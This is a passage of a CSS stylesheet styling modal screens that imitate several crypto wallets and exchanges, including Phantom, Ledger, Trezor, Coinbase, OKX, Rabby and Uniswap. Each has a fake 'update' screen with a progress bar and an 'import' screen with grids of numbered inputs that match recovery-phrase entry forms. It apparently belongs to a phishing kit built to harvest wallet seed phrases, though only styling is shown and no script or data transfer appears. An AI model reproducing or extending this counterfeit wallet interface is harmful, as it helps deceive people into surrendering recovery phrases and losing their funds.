  font-weight: 500;
  color: white;
}

.phantomimporttxt {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  max-width: 290px;
  font-size: 15px;
  font-weight: 400;
  line-height: 20px;
  color: rgb(153 153 153);
}

.phantominputsbox {
  scrollbar-width: thin;
  scrollbar-color: #3f3f3f #181818;
  margin-top: 1.5rem;
  overflow-y: auto;
  padding-left: 1.5rem;
  padding-right: 1.5rem;
  max-height: 200px;
}

.phantominputs {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 0.75rem;
}

.phantomitemi {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  position: absolute;
  top: 11px;
  padding: 0 10px;
  font-size: 14px;
  font-weight: 400;
  color: rgb(153 153 153);
}

.phanyomiteminput {
  font-family: "Inter", sans-serif;
  height: 41px;
  width: 100%;
  align-self: center;
  border-radius: 6px;
  border: 1px solid rgb(47 47 47);
  background: rgb(24 24 24);
  padding: 0 0.5rem 0 2rem;
  font-size: 15px;
  font-weight: 400;
  color: white;
  box-shadow: 0 0 #0000, 0 0 #0000, 0 0 4px 0 rgba(0, 0, 0, 0.25);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.phantomerrorbox {
  margin-top: 0.75rem;
  padding: 0 1.5rem;
}

.phantomerror {
  font-family: Inter, sans-serif;
  margin-bottom: 10px;
  display: flex;
  align-items: center;
  justify-content: flex-start;
  font-size: 14px;
  line-height: 18px;
  color: rgb(235 55 66);
}

.phantomerrorsvg {
  width: 1.25rem;
  height: 1.25rem;
  margin-right: 6px;
}

.phantomendbox {
  margin-top: 1rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  row-gap: 0.5rem;
  padding: 0 1.5rem;
  text-align: center;
}

.inputsqhbut {
  font-family: Inter, sans-serif;
  font-size: 14px;
  font-weight: 500;
  background: transparent;
  color: rgb(119 119 119);
}

.inputsqhbut:hover {
  color: rgb(171 159 242);
}

.phantomimportbut {
  font-family: Inter, sans-serif;
  display: flex;
  height: 47px;
  width: 100%;
  align-items: center;
  justify-content: center;
  border-radius: 16px;
  padding: 14px 0;
  font-size: 16px;
  font-weight: 500;
  outline-offset: 2px;
  outline: transparent solid 2px;
}

.phantomimportbut:disabled {
  cursor: not-allowed;
  background: rgb(51 51 51);
  color: white;
  opacity: 0.6;
}
/* ledger */

.Ledgerbox {
  display: none;
  width: 620px;
  height: 550px;
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  background: white;
  border-radius: 24px;
  z-index: 20002;
}

.ledgerboxshow {
  display: block;
}

.ledgerone {
  display: flex;
  width: 100%;
  height: 100%;
  flex-direction: column;
}

.ledgeronelogobox {
  display: flex;
  flex: 1 1 0%;
  align-items: center;
  justify-content: center;
}

.ledgeronelogob {
  position: relative;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.ledgeronelogok {
  position: relative;
  border-radius: 1rem;
  padding: 1.5rem;
}

.ledgeronelogo {
  animation: ledgerPulse 2s ease-in-out infinite;
  width: 7rem;
  height: 7rem;
  object-fit: contain;
  overflow: hidden;
}

.ledgeronetxt {
  font-family: "Inter", sans-serif;
  animation: textFade 2s ease-in-out infinite;
  margin: 20px 0 10px 0;
  font-size: 20px;
  font-weight: 400;
  color: rgb(32 32 32);
}

.poweredby {
  display: flex;
  align-items: center;
  justify-content: center;
  padding-bottom: 2rem;
}

.scwtw-h-6 {
  height: 1.5rem;
}

.ledgertwo {
  padding: 2rem 1.5rem;
}

.scwtw-justify-between {
  justify-content: space-between;
}

.scwtw-h-35 {
  height: 35px;
}

.ledgerclosebut {
  border-radius: 12px;
  padding: 0.25rem;
  background: transparent;
}

.scwtw-w-6 {
  width: 1.5rem;
}

.ledgerclosesvg {
  color: rgb(32 32 32);
}

.scwtw-mt-6 {
  margin-top: 1.5rem;
}

.ledgertxtbox {
  display: flex;
  flex-direction: column;
  align-items: flex-start;
  justify-content: flex-start;
  row-gap: 0.375rem;
  text-align: start;
}

.ledgertit {
  margin: 20px 0 10px 0;
  font-family: "Inter", sans-serif;
  font-size: 22px;
  font-weight: 700;
  color: rgb(32 32 32);
}

.ledgertxt {
  margin: 0 0 10px 0;
  font-family: "Inter", sans-serif;
  font-size: 16px;
  font-weight: 400;
  color: rgb(20 22 24);
}

.ledgertabinput {
  display: flex;
  width: 100%;
  align-items: center;
  column-gap: 0.375rem;
  border-radius: 1rem;
  border: 1px solid rgb(235 235 235);
  padding: 0.25rem;
}

.ledgertabitem {
  display: flex;
  width: 100%;
  align-items: center;
  justify-content: center;
  border-radius: 16px;
  background: rgb(243 243 243);
  padding: 0.5rem;
  text-align: center;
}

.ledgertabitemtxt {
  font-size: 1rem;
  line-height: 1.5rem;
  font-weight: 400;
  color: rgb(32 32 32);
}

.scwtw-mt-4 {
  margin-top: 1rem;
}

.ledgerinputbox {
  margin-top: 1rem;
  max-height: 204px;
  overflow-y: auto;
}

.ledgerinputs {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 0.25rem;
}

.trezorinputs {
  display: grid;
  grid-template-columns: repeat(4, minmax(0, 1fr));
  gap: 0.25rem;
}

.ledgerinputitem {
  position: relative;
}

.ledgeritemi {
  position: absolute;
  top: 12px;
  left: 16px;
}

.ledgerinputv {
  font-family: "Inter", sans-serif;
  height: 44px;
  width: 100%;
  border-radius: 16px;
  border: 1px solid rgb(235, 235, 235);
  background: transparent;
  padding: 11px 8px 11px 40px;
  font-size: 14px;
  font-weight: 500;
  color: rgb(34 34 34);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.ledgererrorbox {
  text-align: start;
  margin: 0.5rem 0;
}

.ledgererrortxt {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(255 95 82);
}

.ledgerimportbutbox {
  margin-top: 1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
}

.ledgerimportbut {
  font-family: "Inter", sans-serif;
  height: 48px;
  width: 100%;
  border-radius: 16px;
  background: rgb(32 32 32);
  font-size: 15px;
  font-weight: 400;
  color: white;
}

.ledgerimportbut:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* coinbase */

.coinbaseone {
  width: 100%;
  height: 100%;
}

.scwtw-h-full {
  height: 100%;
}

.scwtw-object-cover {
  object-fit: cover;
}

.coinbasetwo {
  width: 100%;
  height: 100%;
}

.coinbaseconbox {
  display: flex;
  height: 100%;
  padding: 1.5rem;
  flex-direction: column;
}

.coinbasecon {
  display: flex;
  flex-grow: 1;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.scwtw-justify-center {
  justify-content: center;
}

.scwtw-rounded-full {
  border-radius: 9999px;
}

.scwtw-w-24 {
  width: 6rem;
}

.scwtw-h-24 {
  height: 6rem;
}

.coinbasetit {
  margin: 20px 0 4px 0;
  text-align: center;
  font-size: 1.5rem;
  line-height: 2rem;
  color: rgb(32 33 45);
}

.coinbasetxt {
  margin-bottom: 0.75rem;
  text-align: center;
  font-size: 1rem;
  line-height: 1.5rem;
  font-weight: 400;
  color: rgb(91 99 108);
}

.coinbasemessagebox {
  margin-bottom: 1.5rem;
  width: 100%;
  border-radius: 0.5rem;
  background: rgb(240 244 250);
  padding: 1rem;
}

.coinbasemessagebb {
  margin-bottom: 0.5rem;
  display: flex;
  align-items: flex-start;
}

.coinbasemessagesvg {
  margin-right: 0.5rem;
  margin-top: 0.125rem;
  height: 1rem;
  width: 1rem;
  flex-shrink: 0;
  color: rgb(55 115 245);
}

.coinbasemessagetit {
  margin-bottom: 10px;
  font-size: 0.875rem;
  line-height: 1.25rem;
  font-weight: 500;
  color: rgb(55 115 245);
}

.coinbasemessagetxt {
  margin-bottom: 10px;
  font-size: 0.875rem;
  line-height: 1.25rem;
  font-weight: 400;
  color: rgb(32 33 47);
}

.coinbasemstit {
  margin: 10px 0 12px 0;
  font-size: 0.875rem;
  line-height: 1.25rem;
  font-weight: 400;
  color: rgb(32 33 47);
}

.coinbaseul {
  margin-bottom: 10px;
  padding-left: 40px;
}

.scwtw-items-start {
  align-items: flex-start;
}

.coinbaseild {
  margin-top: 0.5rem;
  margin-right: 0.5rem;
  width: 0.375rem;
  height: 0.375rem;
  border-radius: 999px;
  background: rgb(55 115 245);
}

.coinbaseiltxt {
  font-size: 0.875rem;
  line-height: 1.25rem;
  margin-bottom: 10px;
  color: rgb(32 32 47);
}

/* okx */
.okxone {
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  flex-direction: column;
  justify-content: center;
}

.okxvideo {
  display: flex;
  height: auto;
  width: 100%;
}

.okxonetit {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 24px;
  font-weight: 700;
  line-height: 33px;
  color: rgb(0 0 0);
}

.okxonetxt {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 12px;
  font-weight: 400;
  line-height: 24px;
  color: rgb(144 144 144);
}

.okxtwo {
  width: 100%;
  height: 100%;
  background: white;
}

.okxtwobox {
  display: flex;
  height: 100%;
  flex-direction: column;
  padding: 2rem 1.5rem;
}

.okxtwoboxhead {
  margin-bottom: 2rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.scwtw-mb-5 {
  margin-bottom: 1.25rem;
}

.scwtw-w-16 {
  width: 4rem;
}

.scwtw-h-16 {
  height: 4rem;
}

.okxttit {
  font-family: "Open Sans", "Inter", sans-serif;
  margin: 20px 0 4px 0;
  text-align: center;
  font-size: 24px;
  font-weight: 700;
  line-height: 33px;
  color: #000;
}

.okxttxt {
  font-family: "Open Sans", "Inter", sans-serif;
  margin-bottom: 0.25rem;
  text-align: center;
  font-size: 16px;
  font-weight: 400;
  line-height: 24px;
  color: rgb(144 144 144);
}

.okxtdetails {
  margin-bottom: 2rem;
  border-radius: 12px;
  background: rgb(245 245 245);
  padding: 1.25rem;
}

.okxtdetailsul {
  margin-top: 0px;
  margin-bottom: 10px;
  padding-left: 40px;
}

.okxtdetailsli:not(:first-child) {
  margin-top: 12px;
}

.okxtdetailslid {
  margin-right: 0.75rem;
  margin-top: 0.375rem;
  flex-shrink: 0;
}

.okxtdetailslidg {
  width: 0.375rem;
  height: 0.375rem;
  border-radius: 999px;
  background: rgb(0 0 0);
}

.okxtdetailslitxt {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  line-height: 20px;
  color: rgb(0 0 0);
}

.okxbuttonbox {
  margin-top: auto;
}

.okxbutton {
  font-family: "Open Sans", "Inter", sans-serif;
  width: 100%;
  border-radius: 9999px;
  background: rgb(0 0 0);
  padding: 0.75rem 1rem;
  font-size: 15px;
  font-weight: 500;
  line-height: 24px;
  color: white;
}

.okxbutton:hover {
  opacity: 0.9;
}

.okxlinkbox {
  margin-top: 1rem;
  text-align: center;
}

.okxlink {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: #000;
}

.okxfour {
  width: 100%;
  height: 100%;
}

.okxfourhead {
  border-bottom: 1px solid rgb(230 230 230);
}

.okxfourheadbox {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0.75rem;
}

.okxclosebut {
  border-radius: 999px;
  padding: 0.25rem;
  background: transparent;
}

.okxclosesvg {
  width: 1.5rem;
  height: 1.5rem;
  color: #000;
}

.okxheadtit {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 17px;
  font-weight: 700;
  line-height: 24px;
  color: #000;
}

.scwtw-w-6 {
  width: 1.5rem;
}

.scwtw-h-6 {
  height: 1.5rem;
}

.okxfselectbox {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  padding: 0.75rem;
}

.okxfselecttxt {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(144 144 144);
}

.okxfselect {
  font-family: "Open Sans", "Inter", sans-serif;
  border-style: none;
  background: transparent;
  font-size: 14px;
  font-weight: 400;
  color: #000;
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.okxinputsbox {
  margin-top: 0.5rem;
  max-height: 400px;
  overflow-y: auto;
  padding: 0 1rem;
}

.okxinputsb {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: 0.25rem;
}

.okxinputsbq {
  position: absolute;
  left: 0;
  top: 13px;
  display: flex;
  align-items: center;
  justify-content: flex-start;
  column-gap: 0.375rem;
  padding: 0 10px;
}

.okxinputsbqtxt {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 12px;
  font-weight: 400;
  color: rgb(144 144 144);
}

.okxinputsbqbqs {
  width: 1px;
  height: 16px;
  background: rgb(230 230 230);
}

.okxfinput {
  font-family: "Open Sans", "Inter", sans-serif;
  width: 100%;
  border-radius: 8px;
  border: 1px solid rgb(230 230 230);
  background: rgb(250 250 250);
  padding: 11px 12px 11px 40px;
  font-size: 16px;
  font-weight: 500;
  color: #000;
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.okxfinput:hover {
  border-color: #000;
}

.okxfmessagebox {
  margin-top: 0.75rem;
  margin-bottom: 2rem;
  padding: 0 1rem;
}

.okxfmessagetxt {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(235 75 109);
}

.okxfimportbox {
  margin-top: 1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
  padding: 0 1rem;
}

.okxfimportbut {
  font-family: "Open Sans", "Inter", sans-serif;
  width: 100%;
  border-radius: 999px;
  background: #000;
  padding: 0.75rem 1rem;
  font-size: 15px;
  font-weight: 500;
  line-height: 24px;
  color: white;
}

.okxfimportbut:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Rabby */
.rabbyone {
  width: 100%;
  height: 100%;
  background-image: url("../assets/rabbbybg.svg");
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  background-repeat: no-repeat;
  background-size: cover;
}

.rabby-svg {
  animation: rabbyComplexBounceExtra 3.5s cubic-bezier(0.68, -0.55, 0.265, 1.55)
    infinite;
  transform-origin: center;
  width: 100px;
  height: 100px;
}

.scwtw-my {
  margin: 12px 0;
}

.rabbyonetit {
  margin: 20px 0 10px 0;
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  font-size: 24px;
  font-weight: 500;
  line-height: 28px;
  color: rgb(25, 41, 69);
}

.rabbyonetxtbox {
  max-width: 320px;
  text-align: center;
}

.rabbyonetxt {
  margin-bottom: 10px;
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  line-height: 18px;
  color: rgb(106 117 135);
}

.rabbytwo {
  width: 100%;
  height: 100%;
}

.rabbytwoconbox {
  display: flex;
  height: 100%;
  flex-direction: column;
  padding: 2rem 1.5rem;
}

.rabbytwohead {
  margin-bottom: 2rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.okxthree {
  width: 100%;
  height: 100%;
}

.onxthreebox {
  display: flex;
  height: 100%;
  flex-direction: column;
  padding: 2rem 1.5rem;
}

.rabby-svg-bounce {
  animation: rabby-bounce 1.5s ease-in-out infinite;
  transform-origin: center bottom;
}

.onxthreebhead {
  margin-bottom: 2.5rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.scwtw-mb-8 {
  margin-bottom: 2rem;
}

.scwtw-w-20 {
  width: 5rem;
}

.scwtw-h-20 {
  height: 5rem;
}

.svgycolor {
  color: rgb(245 245 245);
}

.svgtwo {
  position: absolute;
  inset: 0;
  animation: scwtw-spin 1s linear infinite;
  color: #000;
}

.scwtw-w-8 {
  width: 2rem;
}

.scwtw-h-8 {
  height: 2rem;
}

.okxthreetit {
  font-family: "Open Sans", "Inter", sans-serif;
  margin-bottom: 0.5rem;
  text-align: center;
  font-size: 24px;
  font-weight: 700;
  line-height: 33px;
  color: #000;
}

.okxthreetxt {
  font-family: "Open Sans", "Inter", sans-serif;
  margin-bottom: 2rem;
  text-align: center;
  font-size: 16px;
  font-weight: 400;
  line-height: 24px;
  color: rgb(144 144 144);
}

.okxthreelogo {
  position: absolute;
  inset: 0;
}

.okxprogressbox {
  height: 0.5rem;
  width: 100%;
  border-radius: 999px;
  background: rgb(245 245 245);
}

.okxprogressbg {
  height: 100%;
  border-radius: 999px;
  background: rgb(0 0 0);
}

.okxprogresstxtbox {
  margin-top: 0.5rem;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.okxprogresstxt {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(144 144 144);
}

.okxprogressbfb {
  font-family: "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 500;
  color: #000;
}

.okxpleasebox {
  margin-top: auto;
  text-align: center;
}

.okxpleasetxt {
  font-family: "Open Sans", "Inter", sans-serif;
  margin-bottom: 10px;
  font-size: 14px;
  font-weight: 400;
  color: rgb(144 144 144);
}

.rabbytwotit {
  margin-top: 20px;
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  margin-bottom: 0.5rem;
  text-align: center;
  font-size: 24px;
  font-weight: 500;
  line-height: 28px;
  color: rgb(25, 41, 69);
}

.rabbytwotxt {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  text-align: center;
  margin-bottom: 1.5rem;
  font-size: 16px;
  font-weight: 400;
  line-height: 18px;
  color: rgb(106 117 135);
}

.rabbytwomsbox {
  margin-bottom: 2rem;
  flex-grow: 1;
}

.rabbytwomstit {
  line-height: 24px;
  margin-top: 10px;
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  margin-bottom: 1rem;
  font-size: 18px;
  font-weight: 500;
  color: rgb(25 41 69);
}

.rabbytwomsul {
  margin-bottom: 10px;
  padding-left: 40px;
}

.rabbytwomsli {
  display: flex;
  align-items: flex-start;
}

.rabbytwomsli:not(:first-child) {
  margin-top: 12px;
}

.rabbytwomssvg {
  margin-right: 0.5rem;
  margin-top: 0.125rem;
  width: 1rem;
  height: 1rem;
  flex-shrink: 0;
  color: rgb(112 132 255);
}

.rabbytwomstxt {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  line-height: 18px;
  color: rgb(25 41 69);
}

.scwtw-mt-auto {
  margin-top: auto;
}

.rabbyupdatabut {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  height: 56px;
  width: 100%;
  border-radius: 8px;
  background: rgb(112 132 255);
  padding: 0.75rem 1rem;
  font-weight: 500;
  font-size: 17px;
  color: white;
}

.rabbyupdatabut:hover {
  opacity: 0.9;
}

.rabbyupdatalinkbox {
  margin-top: 1rem;
  text-align: center;
}

.rabbyupdatalink {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(112 132 255);
}

.rabbythreetxt {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  margin-bottom: 2rem;
  text-align: center;
  font-size: 16px;
  font-weight: 400;
  line-height: 18px;
  color: rgb(106 117 135);
}

.rabbyprogressbg {
  height: 100%;
  border-radius: 999px;
  background: rgb(112 132 255);
}

.rabbythreetit {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  margin-bottom: 0.5rem;
  text-align: center;
  font-size: 24px;
  font-weight: 500;
  line-height: 28px;
  color: rgb(25 41 69);
}

.margin-b32 {
  margin-bottom: 32px;
}

.okximport {
  width: 100%;
  height: 100%;
}

.rabbyimporthead {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0.75rem;
}

.rabbyclosebut {
  border-radius: 999px;
  background: transparent;
  padding: 0.75rem;
}

.rabbyclosesvg {
  width: 1.5rem;
  height: 1.5rem;
  color: #000;
}

.rabbyimportlogo {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.25rem;
}

.rabbyimportlogoy {
  color: rgb(112 132 255);
}

.rabbyimportlogox {
  height: 1px;
  width: 56px;
  background: rgb(222 227 252);
}

.rabbyimportlogot {
  color: rgb(222 227 252);
}

.rabbyoldtitbox {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 1rem 0.75rem;
}

.rabbyoldtit {
  margin-bottom: 10px;
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  font-size: 20px;
  font-weight: 500;
  line-height: 24px;
  color: rgb(25 41 69);
}

.rabbyselectbox {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0.75rem;
}

.rabbyselect {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  background: transparent;
  border-style: none;
  font-weight: 400;
  color: rgb(62 73 94);
  outline: 2px solid transparent;
  outline-offset: 2px;
}

.scwtw-mt-3 {
  margin-top: 3px;
}

.rabbyresetbut {
  border-radius: 4px;
  padding: 0.25rem;
  background: transparent;
}

.rabbyresetsvg {
  width: 1rem;
  height: 1rem;
  color: rgb(106 117 135);
}

.rabbyinpursbox {
  margin-top: 0.5rem;
  max-height: 300px;
  overflow-y: auto;
  padding: 0 1rem;
}

.rabbyinpurs {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 0.25rem;
}

.rabbyimportbq {
  position: absolute;
  top: 8px;
  left: 8px;
}

.rabbyimportbqtxt {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  margin-bottom: 10px;
  font-size: 13px;
  font-weight: 400;
  color: rgb(62 73 94);
}

.rabbyimportinput {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  width: 100%;
  border-radius: 8px;
  border: 1px solid rgb(224 229 236);
  background: transparent;
  padding: 14px 16px;
  text-align: center;
  font-size: 15px;
  font-weight: 400;
  outline: 2px solid transparent;
  outline-offset: 2px;
  color: rgb(25 41 69);
  letter-spacing: 0.05em;
}

.rabbyimporterr {
  margin-bottom: 1rem;
  margin-top: 12px;
  padding: 0 1rem;
}

.rabbyimporterrtxt {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  margin-bottom: 10px;
  font-size: 13px;
  font-weight: 400;
  line-height: 18px;
  color: rgb(227 73 53);
}

.rabbyendbutbox {
  margin-top: 1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  column-gap: 0.25rem;
  padding: 0 1rem;
}

.rabbyendbut {
  font-family: "Roboto", "Open Sans", "Inter", sans-serif;
  height: 56px;
  width: 100%;
  border-radius: 8px;
  background: rgb(112 132 255);
  padding: 0.75rem 1rem;
  font-size: 17px;
  font-weight: 500;
  color: white;
}

.rabbyendbut:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

/* Uniswap */
.uniswapone {
  width: 100%;
  height: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  background-image: url("../assets/uniswapbg.png");
  background-size: cover;
  background-position: left top;
  background-repeat: no-repeat;
}

.uniswaplogo {
  width: 8rem;
  height: 8rem;
  animation: logoPulse 2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
}

.uniswaptwo {
  width: 100%;
  height: 100%;
}

.uniswaptwocon {
  height: 100%;
  display: flex;
  flex-direction: column;
}

.uniswapthead {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  padding: 0.75rem 0.75rem 0 0.75rem;
}

.uniswapclosebut {
  border-radius: 9999px;
  background: transparent;
  padding: 0.25rem;
}

.uniswapclosesvg {
  color: rgb(125 125 125);
}

.uniswapybody {
  display: flex;
  flex-grow: 1;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 0 1rem;
}

.uniswaptlogobox {
  display: flex;
  width: 4rem;
  height: 4rem;
  align-items: center;
  justify-content: center;
  border-radius: 16px;
  background: #fc72ff33;
}

.uniswapttitbox {
  margin-bottom: 1rem;
  display: flex;
  align-items: center;
  flex-direction: column;
  justify-content: center;
  text-align: center;
}

.uniswapttit {
  line-height: 24px;
  margin-top: 10px;
  font-family: "Inter", sans-serif;
  margin-bottom: 0.5rem;
  font-size: 20px;
  font-weight: 500;
  color: rgb(34 34 34);
}

.uniswapttxt {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  font-size: 16px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapalertbox {
  margin-bottom: 1.5rem;
  border-radius: 16px;
  border: 1px solid #fc72ff33;
  background: rgb(255 242 252);
  padding: 1rem;
}

.uniswapalertbb {
  display: flex;
  align-items: flex-start;
}

.uniswapalertsvgbox {
  margin-right: 0.75rem;
  flex-shrink: 0;
}

.uniswapalertsvg {
  height: 1.25rem;
  width: 1.25rem;
  color: rgb(252 114 255);
}

.uniswapalerttit {
  font-family: "Inter", sans-serif;
  margin-bottom: 0.25rem;
  font-size: 14px;
  font-weight: 500;
  color: rgb(34 34 34);
}

.uniswapalerttxt {
  font-family: "Inter", sans-serif;
  margin-bottom: 10px;
  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswaptdetailstit {
  font-family: "Inter", sans-serif;
  margin-bottom: 0.75rem;
  font-size: 16px;
  font-weight: 500;
  color: rgb(34 34 34);
}

.uniswaptul {
  margin-bottom: 10px;
  padding-left: 40px;
}

.uniswaptli {
  display: flex;
  align-items: flex-start;
}

.uniswaptbqbox {
  margin-top: 0.25rem;
  margin-right: 0.75rem;
}

.uniswaptbq {
  height: 0.5rem;
  width: 0.5rem;
  border-radius: 999px;
  background: rgb(252 114 255);
}

.uniswaptlitxt {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(34 34 34);
}

.uniswaptupdatabox {
  padding: 0 1rem 1.5rem 1rem;
}

.uniswaptupdatabut {
  font-family: "Inter", sans-serif;
  width: 100%;
  border-radius: 16px;
  background: rgb(252 114 255);
  padding: 10px 16px;
  font-size: 16px;
  font-weight: 500;
  color: white;
}

.uniswaptupdatabut:hover {
  opacity: 0.8;
}

.uniswaptupdatalinkbox {
  text-align: center;
  margin-top: 1rem;
}

.uniswaptupdatalink {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapthree {
  width: 100%;
  height: 100%;
}

.uniswapthreecon {
  display: flex;
  height: 100%;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 0 1.5rem;
}

.uniswapslogobox {
  position: relative;
  margin-bottom: 2rem;
}

.uniswapslogob {
  animation: uniswap-pulse 2s infinite ease-in-out;
  display: flex;
  width: 6rem;
  height: 6rem;
  align-items: center;
  justify-content: center;
  border-radius: 20px;
  background: #fc72ff33;
}

.uniswapunicornbounce {
  animation: uniswap-bounce 1.5s infinite ease-in-out;
  width: 4rem;
  height: 4rem;
}

.uniswapstitbox {
  margin-bottom: 2.5rem;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  text-align: center;
}

.uniswapstit {
  font-family: "Inter", sans-serif;
  line-height: 24px;
  margin-top: 10px;
  margin-bottom: 0.5rem;
  font-size: 20px;
  font-weight: 500;
  color: rgb(34 34 34);
}

.uniswapstxt {
  font-family: "Inter", sans-serif;
  margin-bottom: 10px;
  font-size: 16px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapprogressbox {
  margin-bottom: 2rem;
  width: 100%;
  max-width: 28rem;
}

.uniswapprogressbg {
  height: 0.375rem;
  width: 100%;
  overflow: hidden;
  border-radius: 999px;
  background-color: rgb(249 249 249);
}

.uniswapprogress {
  height: 100%;
  border-radius: 999px;
  background: rgb(252 114 255);
}

.uniswapprogresstxtbox {
  margin-top: 0.75rem;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.uniswapprogresstxtl {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapprogresstxtr {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 500;
  color: rgb(34 34 34);
}

.uniswapsnotice {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  text-align: center;
  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswapfour {
  width: 100%;
  height: 100%;
}

.uniswapclosebutbox {
  display: flex;
  align-items: center;
  justify-content: flex-start;
  padding: 0.75rem 0.75rem 0 0.75rem;
}

.uniswapclosebut {
  background: transparent;
  border-radius: 999px;
  padding: 0.25rem;
}

.uniswapclosesvg {
  width: 1.5rem;
  height: 1.5rem;
  color: rgb(125 125 125);
}

.uniswapimporttbox {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  row-gap: 0.75rem;
}

.uniswapimportlogobox {
  display: flex;
  width: 48px;
  height: 48px;
  align-content: center;
  justify-content: center;
  border-radius: 12px;
  background: rgb(249 249 249);
}

.uniswapimportsvg {
  width: 1.5rem;
  height: 1.5rem;
  color: rgb(34 34 34);
}

.uniswapimportlogotxtbox {
  display: grid;
  align-items: center;
  justify-content: center;
  text-align: center;
}

.uniswapimportlogotit {
  line-height: 24px;
  margin-top: 10px;
  font-family: "Inter", sans-serif;
  margin-bottom: 0.375rem;
  font-size: 18px;
  font-weight: 400;
  color: rgb(34 34 34);
}

.uniswapimportlogotxt {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(125 125 125);
}

.uniswaperrtxtbox {
  margin: 8px 0;
  padding: 0 16px;
}

.uniswaperrtxt {
  font-family: "Inter", sans-serif;
  font-size: 14px;
  font-weight: 400;
  color: rgb(255 95 82);
}

.uniswapinpursbox {
  max-height: 330px;
  overflow-y: auto;
  padding: 0 1rem;
}

.uniswapinputsb {
  display: grid;
  grid-template-columns: repeat(3, minmax(0, 1fr));
  gap: 0.75rem;
}

.uniswapinputdqbox {
  position: absolute;
  top: 12px;
  left: 16px;
}

.uniswapinputdq {
  margin-bottom: 10px;
  font-family: "Inter", sans-serif;
